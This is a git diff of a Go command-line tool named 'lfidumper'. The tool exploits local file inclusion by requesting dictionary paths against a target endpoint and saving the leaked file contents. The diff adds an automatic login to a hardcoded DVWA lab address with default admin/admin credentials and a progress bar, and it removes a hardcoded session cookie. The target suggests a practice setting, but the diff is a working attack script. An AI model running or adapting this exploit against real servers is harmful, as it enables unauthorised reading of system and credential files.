@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -12,6 +13,8 @@ import (
 	"path"
 	"strings"
 	"time"
+
+	"github.com/vardius/progress-go"
 )
 
 // Variables
@@ -51,20 +54,13 @@ func getFile(endpoint string, file string, outputpath string) {
 
 	// Generate url by joining endpoint & file
 	url := endpoint + file
-	fmt.Println(url)
-
-	// Request cookies
-	cookie := &http.Cookie{
-		Name:  "PHPSESSID",
-		Value: "ejud7o1s3a289p04ldl1am8im5",
-	}
+	// fmt.Println(url)
 
 	// Create http Request
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		log.Fatalf(err.Error())
 	}
-	req.AddCookie(cookie)
 	// for _, c := range req.Cookies() {
 	// 	fmt.Println(c)
 	// }
@@ -75,7 +71,6 @@ func getFile(endpoint string, file string, outputpath string) {
 		log.Fatalf("Error occured. Error is: %s", err.Error())
 	}
 	defer response.Body.Close()
-	fmt.Println(response.StatusCode)
 
 	// Get local file contents from response body
 	body, err := ioutil.ReadAll(response.Body)
@@ -83,16 +78,17 @@ func getFile(endpoint string, file string, outputpath string) {
 		fmt.Println(err)
 		return
 	}
+
+	// Get Local file from request body
 	content := string(body)
 	pos := strings.Index(content, "<!DOCTYPE")
 	if pos == -1 {
 		return
 	}
 	content = content[:pos]
-	if len(content) < 3 {
+	if len(content) < 5 {
 		return
 	}
-	fmt.Println(len(content))
 
 	// Create output dir
 	_, err = os.Stat(outputpath)
@@ -106,7 +102,6 @@ func getFile(endpoint string, file string, outputpath string) {
 
 	// Save contents to file
 	outputfilepath := path.Join(outputpath, path.Base(file))
-	fmt.Println(outputfilepath)
 	outputfile, err := os.Create(outputfilepath)
 	if err != nil {
 		fmt.Println(err)
@@ -117,10 +112,27 @@ func getFile(endpoint string, file string, outputpath string) {
 
 }
 
+func getLineCount(path string) int {
+	file, err := os.Open(path)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(-1)
+	}
+	reader := bufio.NewReader(file)
+	nlines := 0
+	for {
+		line, err := reader.ReadString('\n') // Read until end of line
+		if line == "" || (err != nil && err != io.EOF) {
+			break
+		}
+		nlines++
+	}
+	return nlines
+}
+
 func main() {
 
-	var endpoint, outdir, dictionaryPath string
-
+	var endpoint, outdir, dictionaryPath, username, password string
 	// Parse arguments
 	for i, arg := range os.Args[1:] {
 		if string(arg[0]) == "-" {
@@ -131,6 +143,10 @@ func main() {
 				outdir = os.Args[i+2]
 			case "d": // Dictionary
 				dictionaryPath = os.Args[i+2]
+			case "u": // Username
+				username = os.Args[i+2]
+			case "p": // Password
+				password = os.Args[i+2]
 			case "h": // Help menu
 				print_AsciiArt()
 				fmt.Println()
@@ -139,6 +155,8 @@ func main() {
 				fmt.Println("Options:")
 				fmt.Println("\t -e : Endpoint url. -e 'http://target.com/page='")
 				fmt.Println("\t -o : Output directory. -o output.\n\t      If not specified the output directory will be './out'.")
+				fmt.Println("\t -u : Username")
+				fmt.Println("\t -p : Password")
 				fmt.Println("\t -d : Dictionary")
 				fmt.Println("\t -h : Show this menu")
 				fmt.Println()
@@ -159,6 +177,11 @@ func main() {
 		fmt.Println("No dictionary specified. './lfidumper -d dictionary.txt'")
 		os.Exit(-1)
 	}
+	if username == "" || password == "" {
+		fmt.Println("No credentials specified. Using default credentials")
+		username = "admin"
+		password = "admin"
+	}
 	if outdir == "" {
 		outdir = "out"
 		fmt.Println("No output directory specified. Using './" + outdir + "' as the output directory\n")
@@ -172,8 +195,19 @@ func main() {
 	}
 	defer dictionary.Close()
 
+	payload := "username=" + username + "&password=" + password + "&Login=Login"
+	client.Post("http://192.168.1.131/dvwa/login.php", "application/x-www-form-urlencoded", bytes.NewBufferString(payload))
+
 	// Read dictionary lines
+	bar := progress.New(0, int64(getLineCount(dictionaryPath)))
+	_, _ = bar.Start()
 	reader := bufio.NewReader(dictionary)
+
+	defer func() {
+		if _, err := bar.Stop(); err != nil {
+			log.Printf("failed to finish progress: %v", err)
+		}
+	}()
 	var line string
 	for {
 		line, err = reader.ReadString('\n') // Read until end of line
@@ -184,5 +218,6 @@ func main() {
 
 		// Get file contents
 		getFile(endpoint, line, outdir)
+		bar.Advance(1)
 	}
 }
